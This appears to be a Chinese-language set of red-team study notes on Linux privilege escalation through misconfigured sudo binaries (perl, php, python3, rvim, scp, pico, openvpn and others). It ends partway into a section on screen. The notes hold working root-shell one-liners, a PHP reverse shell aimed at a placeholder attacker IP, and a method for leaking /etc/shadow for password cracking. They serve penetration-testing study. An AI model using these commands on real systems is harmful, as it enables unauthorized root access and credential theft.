<h3 id="一、命令各部分解析-1"><a href="#一、命令各部分解析-1" class="headerlink" title="一、命令各部分解析"></a>一、命令各部分解析</h3><h4 id="1-sudo-2"><a href="#1-sudo-2" class="headerlink" title="1. sudo"></a>1. <code>sudo</code></h4><p><strong>以超级用户（root）权限执行后续命令，所有操作继承 root 权限。</strong></p>
<h4 id="2-nohup"><a href="#2-nohup" class="headerlink" title="2. nohup"></a>2. <code>nohup</code></h4><p><strong>本意是让进程脱离终端后继续运行，但此处主要用于****强制维持进程与终端的关联</strong>（即使终端会话异常，仍尝试绑定 TTY），避免 Shell 因终端信号问题退出。</p>
<h4 id="3-bin-bash-c"><a href="#3-bin-bash-c" class="headerlink" title="3. /bin/bash -c &quot;...&quot;"></a>3. <code>/bin/bash -c &quot;...&quot;</code></h4><ul>
<li><code>/bin/bash</code>：启动 bash Shell；</li>
<li><code>-c</code>：执行引号内的命令字符串。</li>
</ul>
<h4 id="4-bash-tty-2-tty"><a href="#4-bash-tty-2-tty" class="headerlink" title="4. bash &lt;$(tty) &gt;$(tty) 2&gt;$(tty)"></a>4. <code>bash &lt;$(tty) &gt;$(tty) 2&gt;$(tty)</code></h4><ul>
<li><code>$(tty)</code>：获取当前终端设备的路径（如 <code>/dev/pts/0</code>）；</li>
<li><code>&lt;$(tty)</code>：将 bash 的标准输入（stdin）重定向到当前终端；</li>
<li><code>&gt;$(tty)</code>：将标准输出（stdout）重定向到当前终端；</li>
<li><code>2&gt;$(tty)</code>：将标准错误（stderr）重定向到当前终端；</li>
<li><strong>整体作用：强制 bash 的所有 IO 流与当前终端设备直接绑定，确保 Shell 具备完整的交互性（输入、输出、错误提示均通过终端）。</strong></li>
</ul>
<h3 id="二、核心原理与效果-1"><a href="#二、核心原理与效果-1" class="headerlink" title="二、核心原理与效果"></a>二、核心原理与效果</h3><h4 id="1-为什么要绑定-TTY？"><a href="#1-为什么要绑定-TTY？" class="headerlink" title="1. 为什么要绑定 TTY？"></a>1. 为什么要绑定 TTY？</h4><p><strong>默认情况下，通过 <strong><code>sudo bash</code> 直接获取的 Shell 可能因缺少 TTY 导致交互异常（如无法使用 <code>su</code>、<code>vim</code> 等需要终端的命令）。而 <code>$(tty)</code> 明确指定终端设备，强制 bash 作为</strong>交互式登录 Shell</strong> 运行，解决 TTY 缺失问题。</p>
<h4 id="2-执行效果-1"><a href="#2-执行效果-1" class="headerlink" title="2. 执行效果"></a>2. 执行效果</h4><p>**命令运行后会生成一个 **<strong>root 权限的交互式 bash Shell</strong>，具备完整的终端交互能力（支持命令补全、历史记录、<code>vim</code>&#x2F;<code>top</code> 等工具），且通过 <code>nohup</code> 确保即使终端会话临时中断，Shell 仍能维持（实际中 <code>nohup</code> 在此处更多是加固作用）。</p>
<h2 id="sudo-openvpn"><a href="#sudo-openvpn" class="headerlink" title="sudo openvpn"></a>sudo openvpn</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251203112418974.png?lastModify=1766751620" alt="image-20251203112418974"></p>
<p>**OpenVPN 是一款 **<strong>开源、跨平台的虚拟专用网络（VPN）软件</strong>，基于 <strong>TLS&#x2F;SSL 协议栈</strong>实现安全的远程访问与网络互联，核心作用是在公共网络（如互联网）中建立加密的 “虚拟隧道”，让设备间的通信具备机密性、完整性和身份认证，广泛用于远程办公、跨地域网络互联、隐私保护等场景。</p>
<p><code>openvpn</code>有配置文件，可以通过参数指定给他读取，这时候可以用它<strong>读取我们无权限读取的文件，如&#x2F;etc&#x2F;shadow</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251203112808429.png?lastModify=1766751620" alt="image-20251203112808429"></p>
<p>**这里虽然报错，但是泄漏的 **<code>/etc/shadow</code>的第一行，尝试hash碰撞即可</p>
<p><strong>依旧是整行取出，放到kali保存文件，然后john破解，得到root账户密码，</strong><code>su</code>切换登录root账户</p>
<h2 id="sudo-passwd"><a href="#sudo-passwd" class="headerlink" title="sudo passwd"></a>sudo passwd</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251204104229035.png?lastModify=1766751620" alt="image-20251204104229035"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251204104351451.png?lastModify=1766751620" alt="image-20251204104351451"></p>
<p>**直接 **<code>sudo passwd root</code>修改root用户的密码，登录root用户即可</p>
<h2 id="sudo-perl"><a href="#sudo-perl" class="headerlink" title="sudo perl"></a>sudo perl</h2><p><strong>Perl 是一种****通用、高级的脚本编程语言</strong>，全称 “Practical Extraction and Reporting Language”（实用提取与报告语言），最初设计用于文本处理、数据提取，后来扩展为能处理 Web 开发、系统管理、网络编程等多种场景的多用途语言，核心特点是灵活、强大的文本操作能力和 “用多种方式做同一件事” 的设计哲学。</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251204104954947.png?lastModify=1766751620" alt="image-20251204104954947"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251204105101808.png?lastModify=1766751620" alt="image-20251204105101808"></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n7357" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> perl <span class="cm-attribute">-e</span> <span class="cm-string">'exec "/bin/bash";'</span></span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<ul>
<li><code>perl -e</code>：直接执行单引号内的 Perl 代码（<code>-e</code> 表示 “一行代码模式”）。</li>
<li><code>exec &quot;/bin/bash&quot;;</code>：Perl 的语法。 <code>exec</code> 函数会<strong>替换当前进程</strong>（此处是 <code>perl</code> 进程）为 <code>/bin/bash</code> 进程，即启动 Bash Shell。</li>
</ul>
<p><strong>这种大型语言一定是可以提权的，只是方法可能不一样</strong></p>
<h2 id="sudo-php"><a href="#sudo-php" class="headerlink" title="sudo php"></a>sudo php</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251204105555207.png?lastModify=1766751620" alt="image-20251204105555207"></p>
<p><code>exec,system,shell_exec,passthru</code>都是可以提权的危险函数</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251204105846598.png?lastModify=1766751620" alt="image-20251204105846598"></p>
<p>**通过 PHP 的 **<code>exec()</code>&#x2F;<code>system()</code>&#x2F;<code>shell_exec()</code> 等函数启动 root 权限的 bash Shell</p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n7373" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> php <span class="cm-attribute">-r</span> <span class="cm-string">"exec('/bin/bash');"</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> php <span class="cm-attribute">-r</span> <span class="cm-string">"system('/bin/bash');"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> php <span class="cm-attribute">-r</span> <span class="cm-string">"shell_exec('/bin/bash');"</span></span></pre></div></div></div></div></div><div></div></div></div></pre>

<ul>
<li><code>-r</code>：PHP 的 “一行代码模式”，直接执行引号内的 PHP 代码；</li>
<li><code>exec(&#39;/bin/bash&#39;)</code>：调用系统命令 <code>/bin/bash</code>，启动交互式 Shell。</li>
</ul>
<p><strong>绑定 TTY 确保交互性</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n7380" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> php <span class="cm-attribute">-r</span> <span class="cm-string">"system('/bin/bash -i <</span><span class="cm-quote">$(tty)</span><span class="cm-string"> ></span><span class="cm-quote">$(tty)</span><span class="cm-string"> 2></span><span class="cm-quote">$(tty)</span><span class="cm-string">');"</span></span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<ul>
<li><code>bash -i</code>：启动交互式 bash；</li>
<li><code>&lt;$(tty) &gt;$(tty) 2&gt;$(tty)</code>：将 Shell 的输入 &#x2F; 输出 &#x2F; 错误流与当前终端绑定，解决交互限制。</li>
</ul>
<p>** **<strong>反弹 Shell</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n7387" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-comment"># 攻击者主机先监听：nc -lvp 443</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> php <span class="cm-attribute">-r</span> <span class="cm-string">"</span><span class="cm-def">$sock</span><span class="cm-string">=fsockopen('攻击者IP',443);exec('/bin/bash -i <&3 >&3 2>&3');"</span></span></pre></div></div></div></div></div><div></div></div></div></pre>

<ul>
<li><code>fsockopen</code>：建立与攻击者主机的 TCP 连接；</li>
<li><code>bash -i &lt;&amp;3 &gt;&amp;3 2&gt;&amp;3</code>：将 Shell 的 IO 流绑定到连接的文件描述符（3），实现反弹。</li>
</ul>
<h2 id="sudo-pico"><a href="#sudo-pico" class="headerlink" title="sudo pico"></a>sudo pico</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251204110250067.png?lastModify=1766751620" alt="image-20251204110250067"></p>
<p><code>pico</code> 是 Linux&#x2F;Unix 系统中<strong>轻量、易用的终端文本编辑器</strong>，是 <code>nano</code> 编辑器的前身（<code>nano</code> 是 <code>pico</code> 的开源复刻版），特点是操作简单（无需记忆复杂快捷键），适合快速编辑文件。</p>
<p><strong>提权方式类似nano</strong></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251204110522723.png?lastModify=1766751620" alt="image-20251204110522723"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251204110601176.png?lastModify=1766751620" alt="image-20251204110601176"></p>
<p><strong>按</strong><code>CTRL+R</code>进入文件读取，再按 <code>CTRL+X</code>执行命令，然后输入 <code>reset;bash 1&gt;&amp;0 2&gt;&amp;0</code></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251204110905477.png?lastModify=1766751620" alt="image-20251204110905477"></p>
<h4 id="1-reset"><a href="#1-reset" class="headerlink" title="1. reset"></a>1. <code>reset</code></h4><p><strong>重置当前终端的状态，包括清除屏幕、恢复默认终端设置（如字符编码、光标位置、输入输出模式），解决因程序崩溃、异常输出导致的终端乱码或无响应问题。</strong></p>
<h4 id="2-bash-1-0-2-0"><a href="#2-bash-1-0-2-0" class="headerlink" title="2. bash 1&gt;&amp;0 2&gt;&amp;0"></a>2. <code>bash 1&gt;&amp;0 2&gt;&amp;0</code></h4><ul>
<li><code>bash</code>：启动一个新的 Bash Shell 进程；</li>
<li><code>1&gt;&amp;0</code>：将标准输出（<code>stdout</code>，文件描述符 1）重定向到标准输入（<code>stdin</code>，文件描述符 0）；</li>
<li><code>2&gt;&amp;0</code>：将标准错误（<code>stderr</code>，文件描述符 2）也重定向到标准输入（<code>stdin</code>）。</li>
</ul>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251204111316229.png?lastModify=1766751620" alt="image-20251204111316229"></p>
<p><strong>获得root shell</strong></p>
<h2 id="sudo-pkexec"><a href="#sudo-pkexec" class="headerlink" title="sudo pkexec"></a>sudo pkexec</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251204114616087.png?lastModify=1766751620" alt="image-20251204114616087"></p>
<p><code>pk</code>指<code>policykit</code> 策略套件。管理系统范围内的策略，允许非特权程序通信以进行特权操作。也就是说是一个特权体系</p>
<p><code>pkexec</code>是<code>policykit</code> 套件中的一个工具，用来执行用户指定的程序，用来<strong>权限操作</strong>。我们提权肯定想指定&#x2F;bin&#x2F;bash</p>
<p><code>pkexec</code> 是 Linux 系统中用于<strong>以另一个用户身份（通常是 root）执行命令</strong>的工具，属于 <code>polkit</code>（政策工具包）框架的一部分，主要用于图形界面或桌面环境中实现权限提升，替代传统的 <code>sudo</code> 或 <code>su</code> 在特定场景下的功能。</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251204115310309.png?lastModify=1766751620" alt="image-20251204115310309"></p>
<h2 id="sudo-python3"><a href="#sudo-python3" class="headerlink" title="sudo python3"></a>sudo python3</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251205111816894.png?lastModify=1766751620" alt="image-20251205111816894"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251205111857816.png?lastModify=1766751620" alt="image-20251205111857816"></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n7429" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> python3 <span class="cm-attribute">-c</span> <span class="cm-string">"import os;os.system('/bin/bash')"</span></span></pre></div></div></div></div></div></div><div></div></div></div></pre>


<table>
<thead>
<tr>
<th><code>python3 -c</code></th>
<th><code>-c</code>是 Python 的 “一行代码执行模式”，直接运行双引号内的 Python 代码，无需编写完整脚本文件。</th>
</tr>
</thead>
<tbody><tr>
<td><strong><code>import os;os.system(&#39;/bin/bash&#39;)</code></strong></td>
<td><strong>Python 代码逻辑：1.<code>import os</code>：导入操作系统交互模块<code>os</code>；2.<code>os.system(&#39;/bin/bash&#39;)</code>：调用<code>os.system</code>执行系统命令<code>/bin/bash</code>，启动新的 Bash Shell 进程。</strong></td>
</tr>
</tbody></table>
<h2 id="sudo-rvim"><a href="#sudo-rvim" class="headerlink" title="sudo rvim"></a>sudo rvim</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251205135652502.png?lastModify=1766751620" alt="image-20251205135652502"></p>
<p><code>rvim</code> 是 <strong>Restricted Vim</strong> 的缩写，即 Vim 编辑器的<strong>受限模式</strong>版本，核心是通过禁用 Vim 的危险功能（如执行外部命令、读写非指定文件），限制用户操作范围，防止未授权的系统访问或文件篡改，常见于多用户环境（如服务器、共享终端）中管控普通用户的编辑权限。</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251205135916678.png?lastModify=1766751620" alt="image-20251205135916678"></p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251205135941685.png?lastModify=1766751620" alt="image-20251205135941685"></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n7444" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> rvim <span class="cm-attribute">-c</span> <span class="cm-string">':python import os; os.execl("/bin/bash","bash","-c","reset;exec bash")'</span></span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<h2 id="sudo-scp"><a href="#sudo-scp" class="headerlink" title="sudo scp"></a>sudo scp</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251209145521389.png?lastModify=1766751620" alt="image-20251209145521389"></p>
<p><code>scp</code>（Secure Copy）是 Linux&#x2F;UNIX 系统中基于 <strong>SSH 协议</strong> 的安全文件 &#x2F; 目录复制工具，核心作用是在<strong>本地主机与远程主机之间</strong>（或两台远程主机之间）加密传输文件 &#x2F; 目录，替代传统的 <code>rcp</code>（无加密），是跨主机文件传输的常用工具。</p>
<p><code>cp</code>只能本地复制，不能跨主机&#x2F;服务器</p>
<p><strong>-S指定</strong><code>ssh</code>程序的参数，我们可以在里面指定我们的提权逻辑</p>
<p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251209145914317.png?lastModify=1766751620" alt="image-20251209145914317"></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="bash" cid="n7453" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang="bash"><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-def">RedteamNotes</span><span class="cm-operator">=</span><span class="cm-quote">$(mktemp)</span></span></pre></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">echo</span> <span class="cm-string">'bash 0<&2 1<&2'</span> > <span class="cm-def">$RedteamNotes</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">chmod</span> <span class="cm-operator">+</span>x <span class="cm-string">"</span><span class="cm-def">$RedteamNotes</span><span class="cm-string">"</span></span></pre><pre class=" CodeMirror-line " role="presentation"><span role="presentation"><span class="cm-builtin">sudo</span> scp <span class="cm-attribute">-S</span> <span class="cm-def">$RedteamNotes</span> x y:</span></pre></div></div></div></div></div><div></div></div></div></pre>

<h3 id="一、命令逐行解析"><a href="#一、命令逐行解析" class="headerlink" title="一、命令逐行解析"></a>一、命令逐行解析</h3><h4 id="1-RedteamNotes-mktemp"><a href="#1-RedteamNotes-mktemp" class="headerlink" title="1. RedteamNotes=$(mktemp)"></a>1. <code>RedteamNotes=$(mktemp)</code></h4><ul>
<li><p><strong>作用</strong><br><strong>：创建一个临时文件，并将文件路径赋值给变量</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n7460" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">RedteamNotes</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<ul>
<li><code>mktemp</code>：Linux 内置命令，在 <code>/tmp</code> 目录生成唯一的临时文件（如 <code>/tmp/tmp.XXXXXX</code>），避免文件名冲突，且默认权限为仅当前用户可读写，隐蔽性强。</li>
<li><strong>红队用临时文件存储恶意脚本，执行后可删除，不留痕迹。</strong></li>
</ul>
</li>
</ul>
<h4 id="2-echo-bash-0"><a href="#2-echo-bash-0" class="headerlink" title="2. echo &#39;bash 0&lt;&amp;2 1&lt;&amp;2&#39; &gt; $RedteamNotes"></a>2. <code>echo &#39;bash 0&lt;&amp;2 1&lt;&amp;2&#39; &gt; $RedteamNotes</code></h4><ul>
<li><p><strong>作用</strong><br><strong>：向临时文件写入核心恶意命令</strong></p>
<pre class="md-fences md-end-block ty-contain-cm modeLoaded" spellcheck="false" contenteditable="true" lang="" cid="n7471" mdtype="fences"><div class="CodeMirror cm-s-inner cm-s-null-scroll CodeMirror-wrap" lang=""><div><textarea autocorrect="off" autocapitalize="off" spellcheck="false" tabindex="0"></textarea></div><div class="CodeMirror-scroll" tabindex="-1"><div class="CodeMirror-sizer"><div><div class="CodeMirror-lines" role="presentation"><div role="presentation"><div class="CodeMirror-measure"><pre><span></span></pre></div><div class="CodeMirror-measure"></div><div></div><div class="CodeMirror-cursors"><div class="CodeMirror-cursor"></div></div><div class="CodeMirror-code" role="presentation"><div class="CodeMirror-activeline"><div class="CodeMirror-activeline-background CodeMirror-linebackground"></div><div class="CodeMirror-gutter-background CodeMirror-activeline-gutter"></div><pre class=" CodeMirror-line " role="presentation"><span role="presentation">bash 0<&2 1<&2</span></pre></div></div></div></div></div></div><div></div></div></div></pre>

<ul>
<li><strong>核心命令拆解：</strong><ul>
<li><code>bash</code>：启动交互式 Bash Shell；</li>
<li><code>0&lt;&amp;2</code>：将标准输入（0）重定向到标准错误（2）；</li>
<li><code>1&lt;&amp;2</code>：将标准输出（1）重定向到标准错误（2）；</li>
<li>**整体效果：强制 Bash 的输入 &#x2F; 输出绑定到标准错误流（SSH 通信的关键流），确保 Shell 能与 **<code>scp</code> 的 SSH 通道交互，避免因流错位导致 Shell 无响应。</li>
</ul>
</li>
</ul>
</li>
</ul>
<h4 id="3-chmod-x-RedteamNotes"><a href="#3-chmod-x-RedteamNotes" class="headerlink" title="3. chmod +x &quot;$RedteamNotes&quot;"></a>3. <code>chmod +x &quot;$RedteamNotes&quot;</code></h4><ul>
<li><strong>作用</strong>：给临时文件添加可执行权限，让系统能将其当作 “可执行程序” 运行（因为后续 <code>scp -S</code> 要求指定的是可执行的 SSH 客户端程序）。</li>
</ul>
<h4 id="4-sudo-scp-S-RedteamNotes-x-y"><a href="#4-sudo-scp-S-RedteamNotes-x-y" class="headerlink" title="4. sudo scp -S $RedteamNotes x y:"></a>4. <code>sudo scp -S $RedteamNotes x y:</code></h4><ul>
<li><strong>核心攻击指令，也是整个命令的关键：</strong><ul>
<li><code>sudo</code>：以 root 权限执行 <code>scp</code>（前提是当前用户被授权 <code>sudo scp</code>，且无需密码 &#x2F; 密码已知）；</li>
<li><code>scp -S $RedteamNotes</code>：<code>-S</code> 是 <code>scp</code> 的核心参数 —— 指定替代默认 <code>ssh</code> 客户端的程序（默认 <code>scp</code> 调用 <code>/usr/bin/ssh</code> 建立连接），这里强制 <code>scp</code> 调用我们创建的临时文件（恶意脚本）作为 “SSH 客户端”；</li>
<li><code>x y:</code>：<code>scp</code> 的常规路径格式（<code>x</code> 是本地文件，<code>y:</code> 是远程主机路径），但此处在攻击中仅作为 “占位符”——<code>scp</code> 会尝试调用 <code>-S</code> 指定的程序连接远程主机，而我们的恶意脚本并不会真正执行 <code>scp</code> 传输，而是启动 Bash Shell。</li>
</ul>
</li>
</ul>
<h3 id="二、核心攻击原理：劫持-scp-的-SSH-客户端"><a href="#二、核心攻击原理：劫持-scp-的-SSH-客户端" class="headerlink" title="二、核心攻击原理：劫持 scp 的 SSH 客户端"></a>二、核心攻击原理：劫持 <code>scp</code> 的 SSH 客户端</h3><p><code>scp</code> 的工作逻辑是：</p>
<blockquote>
<p><code>scp</code> → 调用 <code>ssh</code> 客户端 → 建立远程连接 → 传输文件</p>
</blockquote>
<p>**而这条命令通过 **<code>-S</code> 参数篡改了 “调用 ssh 客户端” 这一步：</p>
<ol>
<li><code>scp</code> 收到 <code>-S $RedteamNotes</code> 后，不会调用默认的 <code>/usr/bin/ssh</code>，而是执行我们的临时脚本；</li>
<li>**临时脚本的内容是 **<code>bash 0&lt;&amp;2 1&lt;&amp;2</code>，因此 <code>scp</code> 执行时不会建立 SSH 连接，而是直接启动一个 Bash Shell；</li>
<li>**由于整个 **<code>scp</code> 是通过 <code>sudo</code> 以 root 权限执行的，因此启动的 Bash Shell 也拥有 <strong>root 权限</strong>—— 红队借此实现提权。</li>
</ol>
<h3 id="三、关键细节补充"><a href="#三、关键细节补充" class="headerlink" title="三、关键细节补充"></a>三、关键细节补充</h3><h4 id="1-为什么用-0"><a href="#1-为什么用-0" class="headerlink" title="1. 为什么用 0&lt;&amp;2 1&lt;&amp;2？"></a>1. 为什么用 <code>0&lt;&amp;2 1&lt;&amp;2</code>？</h4><p><code>scp</code> 调用 <code>-S</code> 指定的程序时，会将标准输入 &#x2F; 输出重定向到 SSH 通信通道，而标准错误流（2）是唯一能与终端交互的流：</p>
<ul>
<li>**若仅写 **<code>bash</code>，Shell 会因输入 &#x2F; 输出流被 <code>scp</code> 占用而 “卡死”（无法输入命令）；</li>
<li><code>0&lt;&amp;2 1&lt;&amp;2</code> 强制 Shell 复用标准错误流，确保交互性，让红队能正常输入命令。</li>
</ul>
<h4 id="2-x-y-的作用？"><a href="#2-x-y-的作用？" class="headerlink" title="2. x y: 的作用？"></a>2. <code>x y:</code> 的作用？</h4><p><code>scp</code> 要求必须指定 “源” 和 “目标” 路径，否则会报错。这里的 <code>x</code>（本地文件，可任意填，甚至不存在）和 <code>y:</code>（远程主机路径，可任意填）仅为满足 <code>scp</code> 的语法要求，实际不会执行任何文件传输 —— 恶意脚本会优先执行 <code>bash</code>，跳过 <code>scp</code> 的正常逻辑。</p>
<h2 id="sudo-screen"><a href="#sudo-screen" class="headerlink" title="sudo screen"></a>sudo screen</h2><p><img src="file:///C:/Users/31831/AppData/Roaming/Typora/typora-user-images/image-20251209150849001.png?lastModify=1766751620" alt="image-20251209150849001"></p>
<p><code>screen</code> 是 Linux&#x2F;Unix 系统中一款<strong>终端会话管理工具</strong>，核心作用是创建 “持久化的终端会话”—— 即使断开当前终端（如 SSH 连接中断、关闭终端窗口），会话内运行的进程仍会继续执行，重新连接后可恢复会话操作。简单说，<code>screen</code> 能让你 “脱离终端控制，保留进程运行状态”，是远程运维、长时间任务执行的必备工具。</p>
<ol>
